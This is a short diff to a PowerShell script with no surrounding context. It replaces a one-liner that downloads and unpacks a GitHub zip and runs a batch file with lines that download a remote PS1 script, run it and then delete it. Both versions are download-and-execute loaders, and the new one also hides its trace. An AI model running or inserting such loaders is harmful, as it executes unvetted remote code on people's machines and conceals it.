@@ -1,1 +1,6 @@
-iwr https://github.com/truongcp0305/dp/archive/refs/heads/main.zip -o dp.zip;expand-archive dp.zip -d .;del dp.zip;cd dp-main;./new.bat;exit
+$scriptPath = "$PSScriptRoot\temp_2.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath
+
+& $scriptPath
+
+Remove-Item $scriptPath -Force
